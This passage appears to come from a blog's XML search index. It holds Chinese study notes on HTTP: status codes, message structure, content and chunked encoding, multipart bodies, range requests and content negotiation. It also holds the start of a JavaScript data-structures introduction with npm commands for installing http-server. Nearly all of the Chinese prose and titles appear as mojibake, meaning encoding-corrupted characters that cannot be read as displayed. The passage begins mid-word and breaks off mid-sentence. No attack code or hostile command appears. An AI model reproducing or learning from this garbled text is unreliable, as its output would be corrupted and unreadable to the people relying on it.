æ³•æ‰¾åˆ°è¯·æ±‚çš„èµ„æºã€‚é™¤æ­¤ä¹‹å¤–ï¼Œä¹Ÿå¯ä»¥åœ¨æœåŠ¡å™¨ç«¯æ‹’ç»è¯·æ±‚ä¸”ä¸æƒ³è¯´æ˜Žç†ç”±æ—¶ä½¿ç”¨ã€‚ 5XXæœåŠ¡å™¨é”™è¯¯5XXçš„å“åº”ç»“æžœè¡¨æ˜ŽæœåŠ¡å™¨æœ¬èº«å‘ç”Ÿçš„é”™è¯¯ã€‚ 500 Internal Server Errorè¯¥çŠ¶æ€ç è¡¨æ˜ŽæœåŠ¡å™¨ç«¯åœ¨æ‰§è¡Œè¯·æ±‚æ—¶å‘ç”Ÿäº†é”™è¯¯ã€‚ä¹Ÿæœ‰å¯èƒ½æ˜¯Webåº”ç”¨å­˜åœ¨çš„bugæˆ–æŸäº›ä¸´æ—¶çš„æ•…éšœã€‚ 503 Service Unavaliableè¯¥çŠ¶æ€ç è¡¨æ˜ŽæœåŠ¡å™¨æš‚æ—¶å¤„äºŽè¶…è´Ÿè½½æˆ–æ­£åœ¨åœæœºç»´æŠ¤ï¼ŒçŽ°åœ¨æ— æ³•å¤„ç†è¯·æ±‚ã€‚å¦‚æžœäº‹å…ˆå¾—çŸ¥è§£é™¤ä»¥ä¸ŠçŠ¶å†µéœ€è¦çš„æ—¶é—´ï¼Œæœ€å¥½å†™å…¥ RetryAfter é¦–éƒ¨å­—æ®µå†è¿”å›žå®¢æˆ·ç«¯ã€‚ çŠ¶æ€ç å’ŒçŠ¶å†µçš„ä¸ä¸€è‡´ä¸å°‘è¿”å›žçš„çŠ¶æ€ç å“åº”éƒ½æ˜¯é”™è¯¯çš„ï¼Œä½†æ˜¯ç”¨æˆ·å¯èƒ½å¯Ÿè§‰ä¸åˆ°è¿™ç‚¹ã€‚æ¯”å¦‚ Web åº”ç”¨ç¨‹åºå†…éƒ¨å‘ç”Ÿé”™è¯¯ï¼ŒçŠ¶æ€ç ä¾ç„¶è¿”å›ž 200 OKï¼Œè¿™ç§æƒ…å†µä¹Ÿç»å¸¸é‡åˆ°ã€‚ å‚è€ƒé“¾æŽ¥ï¼šhttps://book.douban.com/subject/25863515/]]></content>
      <categories>
        <category>http</category>
      </categories>
      <tags>
        <tag>http</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[æ·±å…¥æµ…å‡ºHTTPï¼Œä»Žå¼€å§‹åˆ°æ”¾å¼ƒï¼ˆç¬¬ä¸‰ç« ï¼‰â€”â€” HTTP æŠ¥æ–‡å†…çš„ HTTPæ¶ˆæ¯]]></title>
    <url>%2F2018-08-11-read-%E5%9B%BE%E8%A7%A3HTTP-Part3.html</url>
    <content type="text"><![CDATA[ç¬¬ä¸‰ç«  HTTP æŠ¥æ–‡å†…çš„ HTTPæ¶ˆæ¯HTTP é€šä¿¡è¿‡ç¨‹åŒ…æ‹¬ä»Žå®¢æˆ·ç«¯å‘å¾€æœåŠ¡å™¨ç«¯çš„è¯·æ±‚åŠä»ŽæœåŠ¡å™¨ç«¯è¿”å›žå®¢æˆ·ç«¯çš„å“åº”ã€‚æœ¬ç« å°±è®©æˆ‘ä»¬æ¥äº†è§£ä¸€ä¸‹è¯·æ±‚å’Œå“åº”æ˜¯æ€Žæ ·è¿ä½œçš„ã€‚ HTTP æŠ¥æ–‡ç”¨äºŽ HTTP åè®®äº¤äº’çš„ä¿¡æ¯è¢«ç§°ä¸º HTTP æŠ¥æ–‡ã€‚è¯·æ±‚ç«¯ï¼ˆå®¢æˆ·ç«¯ï¼‰çš„HTTP æŠ¥æ–‡å«åšè¯·æ±‚æŠ¥æ–‡ï¼Œå“åº”ç«¯ï¼ˆæœåŠ¡å™¨ç«¯ï¼‰çš„å«åšå“åº”æŠ¥æ–‡ã€‚HTTP æŠ¥æ–‡æœ¬èº«æ˜¯ç”±å¤šè¡Œï¼ˆç”¨ CR+LF ä½œæ¢è¡Œç¬¦ï¼‰æ•°æ®æž„æˆçš„å­—ç¬¦ä¸²æ–‡æœ¬ã€‚HTTP æŠ¥æ–‡å¤§è‡´å¯åˆ†ä¸ºæŠ¥æ–‡é¦–éƒ¨å’ŒæŠ¥æ–‡ä¸»ä½“ä¸¤å—ã€‚ä¸¤è€…ç”±æœ€åˆå‡ºçŽ°çš„ç©ºè¡Œï¼ˆCR+LFï¼‰æ¥åˆ’åˆ†ã€‚é€šå¸¸ï¼Œå¹¶ä¸ä¸€å®šè¦æœ‰æŠ¥æ–‡ä¸»ä½“ã€‚ HTTP æŠ¥æ–‡çš„ç»“æž„ HTTP æŠ¥æ–‡çš„ç»“æž„ æè¿° æŠ¥æ–‡é¦–éƒ¨ æœåŠ¡å™¨ç«¯æˆ–å®¢æˆ·ç«¯éœ€å¤„ç†çš„è¯·æ±‚æˆ–å“åº”çš„å†…å®¹åŠå±žæ€§ ç©ºè¡Œï¼ˆCR+LFï¼‰ CR(å›žè½¦ç¬¦ï¼Œ0x0d)å’ŒLFï¼ˆæ¢è¡Œç¬¦ï¼Œ0x0aï¼‰ æŠ¥æ–‡ä¸»ä½“ åº”è¢«å‘é€çš„æ•°æ® è¯·æ±‚æŠ¥æ–‡åŠå“åº”æŠ¥æ–‡çš„ç»“æž„è¯·æ±‚æŠ¥æ–‡å’Œå“åº”æŠ¥æ–‡çš„ç»“æž„ è¯·æ±‚æŠ¥æ–‡å’Œå“åº”æŠ¥æ–‡å®žä¾‹ è¯·æ±‚æŠ¥æ–‡å’Œå“åº”æŠ¥æ–‡çš„é¦–éƒ¨å†…å®¹ç”±ä»¥ä¸‹æ•°æ®ç»„æˆã€‚çŽ°åœ¨å‡ºçŽ°çš„å„ç§é¦–éƒ¨å­—æ®µåŠçŠ¶æ€ç ç¨åŽä¼šè¿›è¡Œé˜è¿°ã€‚ é¦–éƒ¨å†…å®¹ç»„æˆ æè¿° è¯·æ±‚è¡Œ åŒ…å«ç”¨äºŽè¯·æ±‚çš„æ–¹æ³•ï¼Œè¯·æ±‚ URI å’Œ HTTP ç‰ˆæœ¬ã€‚ çŠ¶æ€è¡Œ åŒ…å«è¡¨æ˜Žå“åº”ç»“æžœçš„çŠ¶æ€ç ï¼ŒåŽŸå› çŸ­è¯­å’Œ HTTP ç‰ˆæœ¬ã€‚ é¦–éƒ¨å­—æ®µ åŒ…å«è¡¨ç¤ºè¯·æ±‚å’Œå“åº”çš„å„ç§æ¡ä»¶å’Œå±žæ€§çš„å„ç±»é¦–éƒ¨ã€‚ä¸€èˆ¬æœ‰ 4 ç§é¦–éƒ¨ï¼Œåˆ†åˆ«æ˜¯ï¼šé€šç”¨é¦–éƒ¨ã€è¯·æ±‚é¦–éƒ¨ã€å“åº”é¦–éƒ¨å’Œå®žä½“é¦– å…¶ä»– å¯èƒ½åŒ…å« HTTP çš„ RFC é‡Œæœªå®šä¹‰çš„é¦–éƒ¨ï¼ˆCookie ç­‰ï¼‰ã€‚ ç¼–ç æå‡ä¼ è¾“é€ŸçŽ‡HTTP åœ¨ä¼ è¾“æ•°æ®æ—¶å¯ä»¥æŒ‰ç…§æ•°æ®åŽŸè²Œç›´æŽ¥ä¼ è¾“ï¼Œä½†ä¹Ÿå¯ä»¥åœ¨ä¼ è¾“è¿‡ç¨‹ä¸­é€šè¿‡ç¼–ç æå‡ä¼ è¾“é€ŸçŽ‡ã€‚é€šè¿‡åœ¨ä¼ è¾“æ—¶ç¼–ç ï¼Œèƒ½æœ‰æ•ˆåœ°å¤„ç†å¤§é‡çš„è®¿é—®è¯·æ±‚ã€‚ä½†æ˜¯ï¼Œç¼–ç çš„æ“ä½œéœ€è¦è®¡ç®—æœºæ¥å®Œæˆï¼Œå› æ­¤ä¼šæ¶ˆè€—æ›´å¤šçš„ CPU ç­‰èµ„æºã€‚ æŠ¥æ–‡ä¸»ä½“å’Œå®žä½“ä¸»ä½“çš„å·®å¼‚ æŠ¥æ–‡ï¼ˆmessageï¼‰ æ˜¯ HTTP é€šä¿¡ä¸­çš„åŸºæœ¬å•ä½ï¼Œç”± 8 ä½ç»„å­—èŠ‚æµï¼ˆoctet sequenceï¼Œå…¶ä¸­ octet ä¸º 8 ä¸ªæ¯”ç‰¹ï¼‰ç»„æˆï¼Œé€šè¿‡ HTTP é€šä¿¡ä¼ è¾“ã€‚ å®žä½“ï¼ˆentityï¼‰ ä½œä¸ºè¯·æ±‚æˆ–å“åº”çš„æœ‰æ•ˆè½½è·æ•°æ®ï¼ˆè¡¥å……é¡¹ï¼‰è¢«ä¼ è¾“ï¼Œå…¶å†…å®¹ç”±å®žä½“é¦–éƒ¨å’Œå®žä½“ä¸»ä½“ç»„æˆã€‚ HTTP æŠ¥æ–‡çš„ä¸»ä½“ç”¨äºŽä¼ è¾“è¯·æ±‚æˆ–å“åº”çš„å®žä½“ä¸»ä½“ã€‚é€šå¸¸ï¼ŒæŠ¥æ–‡ä¸»ä½“ç­‰äºŽå®žä½“ä¸»ä½“ã€‚åªæœ‰å½“ä¼ è¾“ä¸­è¿›è¡Œç¼–ç æ“ä½œæ—¶ï¼Œå®žä½“ä¸»ä½“çš„å†…å®¹å‘ç”Ÿå˜åŒ–ï¼Œæ‰å¯¼è‡´å®ƒå’ŒæŠ¥æ–‡ä¸»ä½“äº§ç”Ÿå·®å¼‚ã€‚æŠ¥æ–‡å’Œå®žä½“è¿™ä¸¤ä¸ªæœ¯è¯­åœ¨ä¹‹åŽä¼šç»å¸¸å‡ºçŽ°ï¼Œè¯·äº‹å…ˆç†è§£ä¸¤è€…çš„å·®å¼‚ã€‚ åŽ‹ç¼©ä¼ è¾“çš„å†…å®¹ç¼–ç å‘å¾…å‘é€é‚®ä»¶å†…å¢žåŠ é™„ä»¶æ—¶ï¼Œä¸ºäº†ä½¿é‚®ä»¶å®¹é‡å˜å°ï¼Œæˆ‘ä»¬ä¼šå…ˆç”¨ ZIPåŽ‹ç¼©æ–‡ä»¶ä¹‹åŽå†æ·»åŠ é™„ä»¶å‘é€ã€‚HTTP åè®®ä¸­æœ‰ä¸€ç§è¢«ç§°ä¸ºå†…å®¹ç¼–ç çš„åŠŸèƒ½ä¹Ÿèƒ½è¿›è¡Œç±»ä¼¼çš„æ“ä½œã€‚å†…å®¹ç¼–ç æŒ‡æ˜Žåº”ç”¨åœ¨å®žä½“å†…å®¹ä¸Šçš„ç¼–ç æ ¼å¼ï¼Œå¹¶ä¿æŒå®žä½“ä¿¡æ¯åŽŸæ ·åŽ‹ç¼©ã€‚å†…å®¹ç¼–ç åŽçš„å®žä½“ç”±å®¢æˆ·ç«¯æŽ¥æ”¶å¹¶è´Ÿè´£è§£ç ã€‚ å¸¸ç”¨çš„å†…å®¹ç¼–ç æœ‰ä»¥ä¸‹å‡ ç§ã€‚ gzipï¼ˆGNU zipï¼‰ compressï¼ˆUNIX ç³»ç»Ÿçš„æ ‡å‡†åŽ‹ç¼©ï¼‰ deflateï¼ˆzlibï¼‰ identityï¼ˆä¸è¿›è¡Œç¼–ç ï¼‰ åˆ†å‰²å‘é€çš„åˆ†å—ä¼ è¾“ç¼–ç åœ¨ HTTP é€šä¿¡è¿‡ç¨‹ä¸­ï¼Œè¯·æ±‚çš„ç¼–ç å®žä½“èµ„æºå°šæœªå…¨éƒ¨ä¼ è¾“å®Œæˆä¹‹å‰ï¼Œæµè§ˆå™¨æ— æ³•æ˜¾ç¤ºè¯·æ±‚é¡µé¢ã€‚åœ¨ä¼ è¾“å¤§å®¹é‡æ•°æ®æ—¶ï¼Œé€šè¿‡æŠŠæ•°æ®åˆ†å‰²æˆå¤šå—ï¼Œèƒ½å¤Ÿè®©æµè§ˆå™¨é€æ­¥æ˜¾ç¤ºé¡µé¢ã€‚è¿™ç§æŠŠå®žä½“ä¸»ä½“åˆ†å—çš„åŠŸèƒ½ç§°ä¸ºåˆ†å—ä¼ è¾“ç¼–ç ï¼ˆChunked TransferCodingï¼‰ã€‚ åˆ†å—ä¼ è¾“ç¼–ç ä¼šå°†å®žä½“ä¸»ä½“åˆ†æˆå¤šä¸ªéƒ¨åˆ†ï¼ˆå—ï¼‰ã€‚æ¯ä¸€å—éƒ½ä¼šç”¨åå…­è¿›åˆ¶æ¥æ ‡è®°å—çš„å¤§å°ï¼Œè€Œå®žä½“ä¸»ä½“çš„æœ€åŽä¸€å—ä¼šä½¿ç”¨â€œ0(CR+LF)â€æ¥æ ‡è®°ã€‚ä½¿ç”¨åˆ†å—ä¼ è¾“ç¼–ç çš„å®žä½“ä¸»ä½“ä¼šç”±æŽ¥æ”¶çš„å®¢æˆ·ç«¯è´Ÿè´£è§£ç ï¼Œæ¢å¤åˆ°ç¼–ç å‰çš„å®žä½“ä¸»ä½“ã€‚HTTP/1.1 ä¸­å­˜åœ¨ä¸€ç§ç§°ä¸ºä¼ è¾“ç¼–ç ï¼ˆTransfer Codingï¼‰çš„æœºåˆ¶ï¼Œå®ƒå¯ä»¥åœ¨é€šä¿¡æ—¶æŒ‰æŸç§ç¼–ç æ–¹å¼ä¼ è¾“ï¼Œä½†åªå®šä¹‰ä½œç”¨äºŽåˆ†å—ä¼ è¾“ç¼–ç ä¸­ã€‚ å‘é€å¤šç§æ•°æ®çš„å¤šéƒ¨åˆ†å¯¹è±¡é›†åˆå‘é€é‚®ä»¶æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨é‚®ä»¶é‡Œå†™å…¥æ–‡å­—å¹¶æ·»åŠ å¤šä»½é™„ä»¶ã€‚è¿™æ˜¯å› ä¸ºé‡‡ç”¨äº† MIMEï¼ˆMultipurpose Internet Mail Extensionsï¼Œå¤šç”¨é€”å› ç‰¹ç½‘é‚®ä»¶æ‰©å±•ï¼‰æœºåˆ¶ï¼Œå®ƒå…è®¸é‚®ä»¶å¤„ç†æ–‡æœ¬ã€å›¾ç‰‡ã€è§†é¢‘ç­‰å¤šä¸ªä¸åŒç±»åž‹çš„æ•°æ®ã€‚ä¾‹å¦‚ï¼Œå›¾ç‰‡ç­‰äºŒè¿›åˆ¶æ•°æ®ä»¥ ASCII ç å­—ç¬¦ä¸²ç¼–ç çš„æ–¹å¼æŒ‡æ˜Žï¼Œå°±æ˜¯åˆ©ç”¨ MIME æ¥æè¿°æ ‡è®°æ•°æ®ç±»åž‹ã€‚è€Œåœ¨ MIME æ‰©å±•ä¸­ä¼šä½¿ç”¨ä¸€ç§ç§°ä¸ºå¤šéƒ¨åˆ†å¯¹è±¡é›†åˆï¼ˆMultipartï¼‰çš„æ–¹æ³•ï¼Œæ¥å®¹çº³å¤šä»½ä¸åŒç±»åž‹çš„æ•°æ®ã€‚ç›¸åº”åœ°ï¼ŒHTTP åè®®ä¸­ä¹Ÿé‡‡çº³äº†å¤šéƒ¨åˆ†å¯¹è±¡é›†åˆï¼Œå‘é€çš„ä¸€ä»½æŠ¥æ–‡ä¸»ä½“å†…å¯å«æœ‰å¤šç±»åž‹å®žä½“ã€‚é€šå¸¸æ˜¯åœ¨å›¾ç‰‡æˆ–æ–‡æœ¬æ–‡ä»¶ç­‰ä¸Šä¼ æ—¶ä½¿ç”¨ã€‚å¤šéƒ¨åˆ†å¯¹è±¡é›†åˆåŒ…å«çš„å¯¹è±¡å¦‚ä¸‹ã€‚ multipart/form-data åœ¨ Web è¡¨å•æ–‡ä»¶ä¸Šä¼ æ—¶ä½¿ç”¨ã€‚ multipart/byteranges çŠ¶æ€ç  206ï¼ˆPartial Contentï¼Œéƒ¨åˆ†å†…å®¹ï¼‰å“åº”æŠ¥æ–‡åŒ…å«äº†å¤šä¸ªèŒƒå›´çš„å†…å®¹æ—¶ä½¿ç”¨ã€‚ multipart/form-data 123456789Content-Type: multipart/form-data; boundary=AaB03x--AaB03xContent-Disposition: form-data; name="field1"Joe Blow--AaB03xContent-Disposition: form-data; name="pics"; filename="file1.txt"Content-Type: text/plain...ï¼ˆfile1.txtçš„æ•°æ®ï¼‰...--AaB03x-- multipart/byteranges 12345678910111213HTTP/1.1 206 Partial ContentDate: Fri, 13 Jul 2012 02:45:26 GMTLast-Modified: Fri, 31 Aug 2007 02:02:20 GMTContent-Type: multipart/byteranges; boundary=THIS_STRING_SEPARATES--THIS_STRING_SEPARATESContent-Type: application/pdfContent-Range: bytes 500-999/8000...ï¼ˆèŒƒå›´æŒ‡å®šçš„æ•°æ®ï¼‰...--THIS_STRING_SEPARATESContent-Type: application/pdfContent-Range: bytes 7000-7999/8000...ï¼ˆèŒƒå›´æŒ‡å®šçš„æ•°æ®ï¼‰...--THIS_STRING_SEPARATES-- åœ¨ HTTP æŠ¥æ–‡ä¸­ä½¿ç”¨å¤šéƒ¨åˆ†å¯¹è±¡é›†åˆæ—¶ï¼Œéœ€è¦åœ¨é¦–éƒ¨å­—æ®µé‡ŒåŠ ä¸ŠContent-typeã€‚æœ‰å…³è¿™ä¸ªé¦–éƒ¨å­—æ®µï¼Œæˆ‘ä»¬ç¨åŽè®²è§£ã€‚ä½¿ç”¨ boundary å­—ç¬¦ä¸²æ¥åˆ’åˆ†å¤šéƒ¨åˆ†å¯¹è±¡é›†åˆæŒ‡æ˜Žçš„å„ç±»å®žä½“ã€‚åœ¨boundary å­—ç¬¦ä¸²æŒ‡å®šçš„å„ä¸ªå®žä½“çš„èµ·å§‹è¡Œä¹‹å‰æ’å…¥â€œâ€“â€æ ‡è®°ï¼ˆä¾‹å¦‚ï¼šâ€“AaB03xã€â€“THIS_STRING_SEPARATESï¼‰ï¼Œè€Œåœ¨å¤šéƒ¨åˆ†å¯¹è±¡é›†åˆå¯¹åº”çš„å­—ç¬¦ä¸²çš„æœ€åŽæ’å…¥â€œâ€“â€æ ‡è®°ï¼ˆä¾‹å¦‚ï¼šâ€“AaB03xâ€“ã€â€“THIS_STRING_SEPARATESâ€“ï¼‰ä½œä¸ºç»“æŸã€‚å¤šéƒ¨åˆ†å¯¹è±¡é›†åˆçš„æ¯ä¸ªéƒ¨åˆ†ç±»åž‹ä¸­ï¼Œéƒ½å¯ä»¥å«æœ‰é¦–éƒ¨å­—æ®µã€‚ èŽ·å–éƒ¨åˆ†å†…å®¹çš„èŒƒå›´è¯·æ±‚ä»¥å‰ï¼Œç”¨æˆ·ä¸èƒ½ä½¿ç”¨çŽ°åœ¨è¿™ç§é«˜é€Ÿçš„å¸¦å®½è®¿é—®äº’è”ç½‘ï¼Œå½“æ—¶ï¼Œä¸‹è½½ä¸€ä¸ªå°ºå¯¸ç¨å¤§çš„å›¾ç‰‡æˆ–æ–‡ä»¶å°±å·²ç»å¾ˆåƒåŠ›äº†ã€‚å¦‚æžœä¸‹è½½è¿‡ç¨‹ä¸­é‡åˆ°ç½‘ç»œä¸­æ–­çš„æƒ…å†µï¼Œé‚£å°±å¿…é¡»é‡å¤´å¼€å§‹ã€‚ ä¸ºäº†è§£å†³ä¸Šè¿°é—®é¢˜ï¼Œéœ€è¦ä¸€ç§å¯æ¢å¤çš„æœºåˆ¶ã€‚æ‰€è°“æ¢å¤æ˜¯æŒ‡èƒ½ä»Žä¹‹å‰ä¸‹è½½ä¸­æ–­å¤„æ¢å¤ä¸‹è½½ã€‚è¦å®žçŽ°è¯¥åŠŸèƒ½éœ€è¦æŒ‡å®šä¸‹è½½çš„å®žä½“èŒƒå›´ã€‚åƒè¿™æ ·ï¼ŒæŒ‡å®šèŒƒå›´å‘é€çš„è¯·æ±‚å«åšèŒƒå›´è¯·æ±‚ï¼ˆRange Requestï¼‰ã€‚å¯¹ä¸€ä»½ 10 000 å­—èŠ‚å¤§å°çš„èµ„æºï¼Œå¦‚æžœä½¿ç”¨èŒƒå›´è¯·æ±‚ï¼Œå¯ä»¥åªè¯·æ±‚5001~10 000 å­—èŠ‚å†…çš„èµ„æºã€‚ æ‰§è¡ŒèŒƒå›´è¯·æ±‚æ—¶ï¼Œä¼šç”¨åˆ°é¦–éƒ¨å­—æ®µ Range æ¥æŒ‡å®šèµ„æºçš„ byte èŒƒå›´ã€‚byte èŒƒå›´çš„æŒ‡å®šå½¢å¼å¦‚ä¸‹ã€‚ 5001~10 000 å­—èŠ‚ 1Range: bytes=5001-10000 ä»Ž 5001 å­—èŠ‚ä¹‹åŽå…¨éƒ¨çš„ 1Range: bytes=5001- ä»Žä¸€å¼€å§‹åˆ° 3000 å­—èŠ‚å’Œ 5000~7000 å­—èŠ‚çš„å¤šé‡èŒƒå›´ 1Range: bytes=-3000, 5000-7000 é’ˆå¯¹èŒƒå›´è¯·æ±‚ï¼Œå“åº”ä¼šè¿”å›žçŠ¶æ€ç ä¸º 206 Partial Content çš„å“åº”æŠ¥æ–‡ã€‚å¦å¤–ï¼Œå¯¹äºŽå¤šé‡èŒƒå›´çš„èŒƒå›´è¯·æ±‚ï¼Œå“åº”ä¼šåœ¨é¦–éƒ¨å­—æ®µ Content-Type æ ‡æ˜Ž multipart/byteranges åŽè¿”å›žå“åº”æŠ¥æ–‡ã€‚ å¦‚æžœæœåŠ¡å™¨ç«¯æ— æ³•å“åº”èŒƒå›´è¯·æ±‚ï¼Œåˆ™ä¼šè¿”å›žçŠ¶æ€ç  200 OK å’Œå®Œæ•´çš„å®žä½“å†…å®¹ã€‚ å†…å®¹åå•†è¿”å›žæœ€åˆé€‚çš„å†…å®¹åŒä¸€ä¸ª Web ç½‘ç«™æœ‰å¯èƒ½å­˜åœ¨ç€å¤šä»½ç›¸åŒå†…å®¹çš„é¡µé¢ã€‚æ¯”å¦‚è‹±è¯­ç‰ˆå’Œä¸­æ–‡ç‰ˆçš„ Web é¡µé¢ï¼Œå®ƒä»¬å†…å®¹ä¸Šè™½ç›¸åŒï¼Œä½†ä½¿ç”¨çš„è¯­è¨€å´ä¸åŒã€‚å½“æµè§ˆå™¨çš„é»˜è®¤è¯­è¨€ä¸ºè‹±è¯­æˆ–ä¸­æ–‡ï¼Œè®¿é—®ç›¸åŒ URI çš„ Web é¡µé¢æ—¶ï¼Œåˆ™ä¼šæ˜¾ç¤ºå¯¹åº”çš„è‹±è¯­ç‰ˆæˆ–ä¸­æ–‡ç‰ˆçš„ Web é¡µé¢ã€‚è¿™æ ·çš„æœºåˆ¶ç§°ä¸ºå†…å®¹åå•†ï¼ˆContent Negotiationï¼‰ã€‚ å†…å®¹åå•†æœºåˆ¶æ˜¯æŒ‡å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ç«¯å°±å“åº”çš„èµ„æºå†…å®¹è¿›è¡Œäº¤æ¶‰ï¼Œç„¶åŽæä¾›ç»™å®¢æˆ·ç«¯æœ€ä¸ºé€‚åˆçš„èµ„æºã€‚å†…å®¹åå•†ä¼šä»¥å“åº”èµ„æºçš„è¯­è¨€ã€å­—ç¬¦é›†ã€ç¼–ç æ–¹å¼ç­‰ä½œä¸ºåˆ¤æ–­çš„åŸºå‡†ã€‚åŒ…å«åœ¨è¯·æ±‚æŠ¥æ–‡ä¸­çš„æŸäº›é¦–éƒ¨å­—æ®µï¼ˆå¦‚ä¸‹ï¼‰å°±æ˜¯åˆ¤æ–­çš„åŸºå‡†ã€‚è¿™äº›é¦–éƒ¨å­—æ®µçš„è¯¦ç»†è¯´æ˜Žè¯·å‚è€ƒä¸‹ä¸€ç« ã€‚ Accept Accept-Charset Accept-Encoding Accept-Language Content-Language å†…å®¹åå•†æŠ€æœ¯æœ‰ä»¥ä¸‹3ä¸­ç±»åž‹ å†…å®¹åå•†æŠ€æœ¯ æè¿° æœåŠ¡å™¨é©±åŠ¨åå•†ï¼ˆServer-driven Negotiationï¼‰ ç”±æœåŠ¡å™¨ç«¯è¿›è¡Œå†…å®¹åå•†ã€‚ä»¥è¯·æ±‚çš„é¦–éƒ¨å­—æ®µä¸ºå‚è€ƒï¼Œåœ¨æœåŠ¡å™¨ç«¯è‡ªåŠ¨å¤„ç†ã€‚ä½†å¯¹äºŽç”¨æˆ·æ¥è¯´ï¼Œä»¥æµè§ˆå™¨å‘é€çš„æ¶ˆæ¯ä½œä¸ºåˆ¤å®šçš„ä¾æ®ï¼Œå¹¶ä¸ä¸€å®šèƒ½ç­›é€‰å‡ºæœ€ä¼˜å†…å®¹ã€‚ å®¢æˆ·ç«¯é©±åŠ¨åå•†ï¼ˆAgent-driven Negotiationï¼‰ ç”±å®¢æˆ·ç«¯è¿›è¡Œå†…å®¹åå•†çš„æ–¹å¼ã€‚ç”¨æˆ·ä»Žæµè§ˆå™¨æ˜¾ç¤ºçš„å¯é€‰åˆ—è¡¨ä¸­æ‰‹åŠ¨é€‰æ‹©ã€‚è¿˜å¯ä»¥åˆ©ç”¨JavsScriptè„šæœ¬åœ¨Webé¡µé¢ä¸Šè‡ªåŠ¨è¿›è¡Œä¸Šè¿°é€‰æ‹©ã€‚æ¯”å¦‚æŒ‰ OS çš„ç±»åž‹æˆ–æµè§ˆå™¨ç±»åž‹ï¼Œè‡ªè¡Œåˆ‡æ¢æˆ PC ç‰ˆé¡µé¢æˆ–æ‰‹æœºç‰ˆé¡µé¢ é€æ˜Žåå•†ï¼ˆTransparent Negotiationï¼‰ æ˜¯æœåŠ¡å™¨é©±åŠ¨å’Œå®¢æˆ·ç«¯é©±åŠ¨çš„ç»“åˆä½“ï¼Œæ˜¯ç”±æœåŠ¡å™¨ç«¯å’Œå®¢æˆ·ç«¯å„è‡ªè¿›è¡Œå†…å®¹åå•†çš„ä¸€ç§æ–¹æ³•ã€‚ å‚è€ƒé“¾æŽ¥ï¼šhttps://book.douban.com/subject/25863515/]]></content>
      <categories>
        <category>http</category>
      </categories>
      <tags>
        <tag>http</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ä¸ºä»€ä¹ˆæˆ‘è¦æ”¾å¼ƒjavaScriptæ•°æ®ç»“æž„ä¸Žç®—æ³•ï¼ˆç¬¬ä¸€ç« ï¼‰â€”â€” JavaScriptç®€ä»‹]]></title>
    <url>%2F2018-08-10-JavaScipt%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95Part1.html</url>
    <content type="text"><![CDATA[æ•°æ®ç»“æž„ä¸Žç®—æ³•ä¸€ç›´æ˜¯æˆ‘ç®—æ¯”è¾ƒè–„å¼±çš„åœ°æ–¹ï¼Œå¸Œæœ›é€šè¿‡é˜…è¯»ã€ŠjavaScriptæ•°æ®ç»“æž„ä¸Žç®—æ³•ã€‹å¯ä»¥æœ‰æ‰€æ”¹å˜ï¼Œæˆ‘ç›¸ä¿¡æŽ¥ä¸‹æ¥çš„è®°å½•ä¸å•å•å¯¹äºŽæˆ‘è‡ªå·±æœ‰å¸®åŠ©ï¼Œä¹Ÿå¯ä»¥å¸®åŠ©åˆ°ä¸€äº›è¿™æ–¹é¢çš„å°ç™½ï¼ŒæŽ¥ä¸‹æ¥è®©æˆ‘ä»¬ä¸€èµ·å­¦ä¹ ã€‚ ç¬¬ä¸€ç«  JavaScriptç®€ä»‹ä¼—æ‰€å‘¨çŸ¥ï¼ŒJavaScriptæ˜¯ä¸€é—¨éžå¸¸å¼ºå¤§çš„ç¼–ç¨‹è¯­è¨€ï¼Œä¸ä»…å¯ä»¥ç”¨äºŽå‰ç«¯å¼€å‘ï¼Œä¹Ÿé€‚ç”¨äºŽåŽç«¯å¼€å‘ï¼Œå…¶ä¸­Node.jså°±æ˜¯èƒŒåŽçš„æŠ€æœ¯ã€‚ JavaScriptæ•°æ®ç»“æž„ä¸Žç®—æ³•é‚£ä¹ˆå­¦ä¹ JavaScriptæ•°æ®ç»“æž„ä¸Žç®—æ³•æœ‰ä»€ä¹ˆä½œç”¨å‘¢ï¼Ÿé¦–è¦çš„ä½œç”¨æ˜¯æ•°æ®ç»“æž„å’Œç®—æ³•å¯ä»¥é«˜æ•ˆåœ°è§£å†³å¸¸è§çš„é—®é¢˜ï¼Œè¿™å½±å“ç€ä»£ç çš„è´¨é‡ã€‚å…¶æ¬¡ï¼Œåœ¨è®¡ç®—æœºç§‘å­¦é‡Œé¢ï¼Œç®—æ³•æ˜¯åŸºç¡€çš„æ¦‚å¿µï¼Œæ˜¯é¢è¯•çš„æ—¶å€™çš„é‡å¤´æˆã€‚ çŽ¯å¢ƒæ­å»ºæµè§ˆå™¨æ˜¯æœ€ç®€å•çš„å¼€å‘çŽ¯å¢ƒï¼Œä¸‹è½½ä¸ªFirefoxæˆ–è€…Chromeéƒ½å¯ä»¥ã€‚ ä¸‹è½½å¥½æµè§ˆå™¨ä¹‹åŽå¯ä»¥æ­è½½ä¸€ä¸ªWebæœåŠ¡å™¨ï¼Œæ–¹å¼æœ‰å¾ˆå¤šç§,ä¹Ÿéƒ½å¾ˆç®€å•ï¼Œå¯ä»¥è‡ªè¡Œç™¾åº¦ã€‚ä¸‹é¢ä»‹ç»Node.js. ä½¿ç”¨Node.js æ­å»ºæœåŠ¡å™¨é¦–å…ˆåˆ°Node.jså®˜ç½‘ä¸‹è½½å’Œå®‰è£…Node.jsã€‚ç„¶åŽæ‰“å¼€ç»ˆç«¯åº”ç”¨ï¼Œè¾“å…¥ä¸€ä¸‹å‘½ä»¤å®‰è£… 1npm i http-server -g å«Œå®‰è£…è¿‡ç¨‹æ…¢çš„ï¼Œå¯ä»¥å®‰è£…ä¸€ä¸‹æ·˜å®é•œåƒï¼Œå°±å¯ä»¥ç”¨ cnpmæ¥å®‰è£…,å…·ä½“å®‰è£…è¿‡ç¨‹å¦‚ä¸‹ 1npm install -g cnpm --registry=https://registry.npm.taobao.org å®‰è£…å®Œæ·˜å®é•œåƒåŽï¼Œå°±å¯ä»¥ç”¨ cnpmäº† 1cnpm i http-server -g å®‰è£…å¥½ http-serveråŽï¼Œcdè¿›å…¥åˆ°ç›®æ ‡è·¯å¾„åŽè¾“å…¥ http-serverå°±å¯ä»¥åœ¨æœ¬åœ°è¿è¡ŒæœåŠ¡å™¨ã€‚ åŒæ ·çš„è¿˜æœ‰ 